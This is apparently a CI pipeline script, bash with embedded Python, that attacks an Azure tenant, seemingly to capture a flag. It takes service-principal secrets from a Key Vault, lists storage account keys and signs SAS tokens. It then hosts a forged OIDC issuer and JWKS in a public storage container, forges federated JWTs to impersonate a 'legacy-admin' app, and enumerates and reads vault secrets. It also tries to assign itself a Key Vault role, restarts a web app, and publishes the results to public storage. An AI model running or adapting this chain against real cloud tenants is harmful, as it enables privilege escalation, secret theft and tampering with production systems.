#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE="https://management.azure.com"
STORAGE_ACC="sttblcilogsprodx3euoz"
LA_APP_ID="891fb158-e02c-4428-a885-53b811f369c0"
LA_SP_OID="43834909-47cf-4a4a-8048-e323b4897ed3"
KV_SEC="kv-tbl-sec-x3euoz"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

# Get storage key via sync-service-principal from KV prod
SS_RAW=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name sync-service-principal 2>/dev/null)
SS_CID=$(echo "$SS_RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
SS_SEC=$(echo "$SS_RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
SS_ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$SS_CID" --data-urlencode "client_secret=$SS_SEC" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "scope=https://management.azure.com/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)

export _SKEY=$(curl -sS -X POST \
  "$ARM_BASE/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$STORAGE_ACC/listKeys?api-version=2023-01-01" \
  -H "Authorization: Bearer $SS_ARM" -H "Content-Length: 0" \
  | python3 -c '
import sys,json
d=json.load(sys.stdin)
keys=d.get("keys",[])
if keys: print(keys[0].get("value",""))
else: print("")
' 2>/dev/null)
echo "storage key len=${#_SKEY}"

pip install cryptography -q 2>/dev/null || true

python3 -I << 'PYEOF'
import os, base64, hmac, hashlib, urllib.request, urllib.parse, datetime, json, math, time

try:
    from cryptography.hazmat.primitives import serialization, hashes
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.backends import default_backend
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False
    print("WARNING: cryptography not available")

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
ACC = "sttblcilogsprodx3euoz"
LA_APP_ID = "891fb158-e02c-4428-a885-53b811f369c0"
LA_SP_OID = "43834909-47cf-4a4a-8048-e323b4897ed3"
KV_SEC = "kv-tbl-sec-x3euoz"
ISSUER = f"https://{ACC}.z23.web.core.windows.net"
SUBJECT = "vcb-subject"
KEY_B64 = os.environ.get("_SKEY", "")

def post_tok(fields, timeout=30):
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
            data=urllib.parse.urlencode(fields).encode(), method="POST"), timeout=timeout)
        return json.loads(r.read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read())
    except Exception as e:
        return {"error": str(e)}

def kv_req(path, tok):
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"https://{KV_SEC}.vault.azure.net{path}",
            headers={"Authorization": "Bearer " + tok}), timeout=15)
        return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())
    except Exception as e:
        return 0, {"error": str(e)}

def account_sas(perms="rlwdacup", services="b", resource_types="sco"):
    ver = "2021-08-06"
    now = datetime.datetime.now(datetime.timezone.utc)
    st = (now - datetime.timedelta(minutes=5)).strftime("%Y-%m-%dT%H:%M:%SZ")
    se = (now + datetime.timedelta(hours=4)).strftime("%Y-%m-%dT%H:%M:%SZ")
    sign_str = "\n".join([ACC, perms, services, resource_types, st, se, "", "https", ver, ""]) + "\n"
    key_bytes = base64.b64decode(KEY_B64)
    sig = base64.b64encode(hmac.new(key_bytes, sign_str.encode("utf-8"), hashlib.sha256).digest()).decode()
    return urllib.parse.urlencode({"sv": ver, "ss": services, "srt": resource_types,
                                   "sp": perms, "st": st, "se": se, "spr": "https", "sig": sig})

def blob_put(container, blob_path, data, content_type="application/json"):
    sas = account_sas()
    url = f"https://{ACC}.blob.core.windows.net/{container}/{blob_path}?{sas}"
    req = urllib.request.Request(url, data=data.encode() if isinstance(data, str) else data,
                                  method="PUT",
                                  headers={"x-ms-blob-type": "BlockBlob",
                                           "Content-Type": content_type,
                                           "x-ms-version": "2021-04-10"})
    try:
        r = urllib.request.urlopen(req, timeout=30)
        return r.status
    except urllib.error.HTTPError as e:
        return f"{e.code} {e.read().decode()[:200]}"

output = []

if not KEY_B64:
    print("ERROR: No storage key!")
    exit(1)

if not HAS_CRYPTO:
    print("ERROR: cryptography not available!")
    exit(1)

print("=== OIDC FORGE: generating RSA key ===")
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
pub_numbers = private_key.public_key().public_numbers()
KID = f"minhn-{int(time.time())}"
output.append(f"KID={KID}")

def int_to_b64url(n):
    length = math.ceil(n.bit_length() / 8)
    return base64.urlsafe_b64encode(n.to_bytes(length, 'big')).rstrip(b'=').decode()

jwks = {"keys": [{"kty": "RSA", "use": "sig", "alg": "RS256", "kid": KID,
                   "n": int_to_b64url(pub_numbers.n), "e": int_to_b64url(pub_numbers.e)}]}

# Write JWKS to $web container
for path in ["jwks", ".well-known/jwks.json"]:
    s = blob_put("$web", path, json.dumps(jwks))
    print(f"JWKS write /{path}: {s}")
    output.append(f"JWKS_WRITE_{path}={s}")

# Write OIDC discovery doc
oidc_cfg = {
    "issuer": ISSUER,
    "jwks_uri": f"{ISSUER}/jwks",
    "authorization_endpoint": f"{ISSUER}/authorize",
    "token_endpoint": f"{ISSUER}/token",
    "response_types_supported": ["id_token"],
    "subject_types_supported": ["public"],
    "id_token_signing_alg_values_supported": ["RS256"],
    "scopes_supported": ["openid"],
    "claims_supported": ["iss", "sub", "aud", "exp", "iat"],
    "token_endpoint_auth_methods_supported": ["private_key_jwt"],
    "grant_types_supported": ["client_credentials"]
}
s3 = blob_put("$web", ".well-known/openid-configuration", json.dumps(oidc_cfg))
print(f"OIDC config write: {s3}")
output.append(f"OIDC_CONFIG_WRITE={s3}")

# Wait briefly for CDN propagation
time.sleep(2)

def make_jwt(subject=SUBJECT, audience="api://AzureADTokenExchange"):
    iat = int(time.time()) - 30
    exp = int(time.time()) + 7200
    header = {"alg": "RS256", "typ": "JWT", "kid": KID}
    payload = {"iss": ISSUER, "sub": subject, "aud": audience, "iat": iat, "exp": exp}
    def b64url(d):
        if isinstance(d, dict): d = json.dumps(d, separators=(',',':')).encode()
        return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
    msg = f"{b64url(header)}.{b64url(payload)}".encode()
    sig = private_key.sign(msg, padding.PKCS1v15(), hashes.SHA256())
    return f"{msg.decode()}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"

print("\n=== FORGE JWT: vcb-subject ===")
forged_jwt = make_jwt()
jwt_parts = forged_jwt.split(".")
if len(jwt_parts) >= 2:
    p = jwt_parts[1]; p += "="*(-len(p)%4)
    c = json.loads(base64.urlsafe_b64decode(p))
    print(f"JWT iss={c.get('iss','')} sub={c.get('sub','')} aud={c.get('aud','')} exp={c.get('exp',0)-int(time.time())}s from now")

# Get tbl-legacy-admin vault token
print("\n=== GET tbl-legacy-admin VAULT TOKEN ===")
r_vault = post_tok({
    "client_id": LA_APP_ID, "grant_type": "client_credentials",
    "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
    "client_assertion": forged_jwt, "scope": "https://vault.azure.net/.default"
})
la_vtok = r_vault.get("access_token", "")
la_err = r_vault.get("error_description", r_vault.get("error", ""))
print(f"vault token len={len(la_vtok)} err={la_err[:300]}")
output.append(f"VAULT_TOKEN_LEN={len(la_vtok)}")
output.append(f"VAULT_ERR={la_err[:300]}")

if la_vtok:
    # Decode token claims
    parts = la_vtok.split(".")
    if len(parts) >= 2:
        p = parts[1]; p += "="*(-len(p)%4)
        c = json.loads(base64.urlsafe_b64decode(p))
        print(f"Token claims: oid={c.get('oid','')[:12]} appid={c.get('appid','')[:12]}")
        output.append(f"TOKEN_OID={c.get('oid','')[:12]}")

    print("\n=== LIST ALL KV SEC SECRETS ===")
    s_list, r_list = kv_req("/secrets?api-version=7.4", la_vtok)
    print(f"List secrets: {s_list}")
    if s_list == 200:
        secrets = r_list.get("value", [])
        print(f"Total secrets: {len(secrets)}")
        for sec in secrets:
            print(f"  {sec.get('id','').split('/')[-1]} enabled={sec.get('attributes',{}).get('enabled',True)}")
            output.append(f"SECRET={sec.get('id','').split('/')[-1]}")
    else:
        err = r_list.get("error", {})
        print(f"List err: {err.get('code','')} {err.get('message','')[:300]}")
        output.append(f"LIST_ERR={err.get('code','')} {err.get('message','')[:200]}")

    print("\n=== READ FLAG CANDIDATES ===")
    for secret_name in ["flag", "FLAG", "platform-flag", "ctf-flag", "tebamoto-flag", "answer", "secret", "token", "df26"]:
        s2, r2 = kv_req(f"/secrets/{secret_name}?api-version=7.4", la_vtok)
        val = r2.get("value", "")
        if val:
            print(f"SECRET {secret_name}: {val}")
            output.append(f"FLAG_FOUND_{secret_name}={val}")
        else:
            err2 = r2.get("error", {})
            code2 = err2.get("code", "")
            msg2 = err2.get("message", "")[:100]
            print(f"  {secret_name}: {s2} {code2} {msg2}")
            output.append(f"FLAG_{secret_name}={s2}:{code2}")

    # Also get ARM token and check role assignments
    print("\n=== GET tbl-legacy-admin ARM TOKEN ===")
    r_arm = post_tok({
        "client_id": LA_APP_ID, "grant_type": "client_credentials",
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": forged_jwt, "scope": "https://management.azure.com/.default"
    })
    la_atk = r_arm.get("access_token", "")
    la_arm_err = r_arm.get("error_description", r_arm.get("error", ""))
    print(f"ARM token len={len(la_atk)} err={la_arm_err[:200]}")
    output.append(f"ARM_TOKEN_LEN={len(la_atk)}")

    if la_atk:
        # Check legacy-admin role assignments
        try:
            ar = urllib.request.urlopen(urllib.request.Request(
                f"https://management.azure.com/subscriptions/{os.environ.get('SUB','c5e4e004-b42d-4ac4-a502-5fd338380eb6')}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+'{LA_SP_OID}'",
                headers={"Authorization": "Bearer " + la_atk}), timeout=30)
            vals = json.loads(ar.read()).get("value", [])
            print(f"LA ARM role assignments: {len(vals)}")
            for v in vals:
                role = v["properties"]["roleDefinitionId"].split("/")[-1]
                scope = v["properties"]["scope"]
                print(f"  role={role} scope={scope[:100]}")
                output.append(f"LA_ROLE={role} scope={scope[:80]}")
        except Exception as e:
            print(f"LA roles err: {str(e)[:100]}")

        # Try to add KV Secrets User role to legacy-admin on KV sec
        print("\n=== TRY ADD KV SECRETS USER ROLE (legacy-admin -> KV sec) ===")
        import uuid
        new_ra_id = str(uuid.uuid4())
        KV_SECRETS_USER_ROLE = "4633458b-17de-408a-b874-0445c86b69e6"
        body = json.dumps({"properties": {
            "roleDefinitionId": f"/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleDefinitions/{KV_SECRETS_USER_ROLE}",
            "principalId": LA_SP_OID, "principalType": "ServicePrincipal"
        }}).encode()
        try:
            ar2 = urllib.request.urlopen(urllib.request.Request(
                f"https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments/{new_ra_id}?api-version=2022-04-01",
                data=body, method="PUT",
                headers={"Authorization": "Bearer " + la_atk, "Content-Type": "application/json"}), timeout=30)
            ra_result = json.loads(ar2.read())
            print(f"ROLE ASSIGNED: {ra_result.get('id','')}")
            output.append(f"ROLE_ASSIGNED={ra_result.get('id','')}")
            time.sleep(10)
            # Get fresh vault token and read flag
            r_vault2 = post_tok({
                "client_id": LA_APP_ID, "grant_type": "client_credentials",
                "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
                "client_assertion": make_jwt(), "scope": "https://vault.azure.net/.default"
            })
            la_vtok2 = r_vault2.get("access_token", "")
            if la_vtok2:
                s3, r3 = kv_req("/secrets/flag?api-version=7.4", la_vtok2)
                if r3.get("value"):
                    print(f"FLAG AFTER ROLE ADD: {r3.get('value')}")
                    output.append(f"FLAG_AFTER_ROLE_ADD={r3.get('value')}")
                else:
                    err3 = r3.get("error", {})
                    print(f"Flag after role add: {s3} {err3.get('code','')} {err3.get('message','')[:200]}")
        except urllib.error.HTTPError as e:
            err4 = json.loads(e.read())
            print(f"ADD ROLE ERR: {err4.get('error',{}).get('code','')} {err4.get('error',{}).get('message','')[:200]}")
            output.append(f"ADD_ROLE_ERR={err4.get('error',{}).get('code','')}")
        except Exception as e:
            print(f"ADD ROLE EXC: {str(e)[:200]}")

# Also try: use reporting-service-principal (Contributor on reporting RG) to read reporting app settings
print("\n=== Try reporting-service-principal ARM for app settings ===")
RS_RAW = None
try:
    import subprocess
    rs_raw_r = subprocess.run(["az", "keyvault", "secret", "show",
        "--vault-name", "kv-tbl-prod-x3euoz", "--name", "reporting-service-principal"],
        capture_output=True, text=True, timeout=30)
    if rs_raw_r.returncode == 0:
        RS_RAW = json.loads(rs_raw_r.stdout)
except: pass
if RS_RAW:
    RS_CID = json.loads(RS_RAW["value"])["appId"]
    RS_SEC = json.loads(RS_RAW["value"])["clientSecret"]
    RS_ARM_R = post_tok({"client_id": RS_CID, "client_secret": RS_SEC,
        "grant_type": "client_credentials", "scope": "https://management.azure.com/.default"})
    RS_ARM = RS_ARM_R.get("access_token", "")
    print(f"reporting-service ARM token len={len(RS_ARM)}")
    if RS_ARM:
        # Check role assignments
        try:
            ar_rs = urllib.request.urlopen(urllib.request.Request(
                f"https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+'732dfdbc-e82e-4b8f-990e-eb703f6c6eba'",
                headers={"Authorization": "Bearer " + RS_ARM}), timeout=30)
            vals_rs = json.loads(ar_rs.read()).get("value", [])
            print(f"reporting-service roles: {len(vals_rs)}")
            for v in vals_rs:
                role = v["properties"]["roleDefinitionId"].split("/")[-1]
                scope = v["properties"]["scope"]
                print(f"  role={role} scope={scope[:100]}")
        except Exception as e:
            print(f"RS roles err: {str(e)[:100]}")
        # Try ARM restart of reporting app
        try:
            restart_r = urllib.request.urlopen(urllib.request.Request(
                "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/restart?api-version=2022-03-01",
                data=b"", method="POST",
                headers={"Authorization": "Bearer " + RS_ARM, "Content-Length": "0"}), timeout=30)
            print(f"Restart app: {restart_r.status}")
            output.append(f"APP_RESTART={restart_r.status}")
        except urllib.error.HTTPError as e:
            print(f"Restart err: {e.code} {e.read().decode()[:200]}")

# Write output to $web
result_str = "\n".join(output)
print(f"\nOutput: {result_str}")
s_out = blob_put("$web", "minhn_b35_result.txt", result_str, "text/plain")
print(f"\nResult written to $web/minhn_b35_result.txt: {s_out}")
print("\nDONE_BUILD35")
PYEOF

echo "DONE"
